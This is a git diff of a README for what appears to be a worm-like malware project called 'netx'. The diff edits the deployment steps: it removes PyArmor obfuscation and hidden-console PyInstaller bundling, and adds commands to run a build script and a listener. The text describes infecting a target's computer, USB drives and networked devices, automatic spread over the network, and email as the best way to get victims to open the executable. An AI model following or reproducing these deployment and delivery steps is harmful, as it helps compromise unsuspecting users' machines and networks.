@@ -25,23 +25,18 @@ Network Noise: ```nmap``` scans are noisy. On a corporate network, this will lik
 ### 📦 Compilation & Deployment
 
 To ensure maximum compatibility and stealth, the script must be obfuscated and bundled into a standalone binary.
-
-1. Obfuscation (Via PyArmor)
-
-To protect the source code from static analysis and string-based detection (ALREADY DONE)
-
-2. Bundling (Via PyInstaller)
-
-Run this on a Windows environment to generate the final .exe:
-
 ```
 cd netx
-pyinstaller --onefile --noconsole --add-data "wordlist.txt;." dist/main.py
 ```
-Note: The ```--noconsole``` flag ensures the process runs purely in the background without a terminal window.
+```bash
+./go.sh
+```
+```
+python3 listener.py
+```
 
-To make this work, the inception target must open the .exe file, could be via email, USB, etc...
-The program will do the rest and infect the computer, USB's other devices on the network, and so on.
+To make this work, the inception target must open the .exe file only if it's spread by email or USB, but when spreading by network it runs automatically.
+Using email is the best option since the target opens the file directly.
 
 ### 📂 Project Structure
 
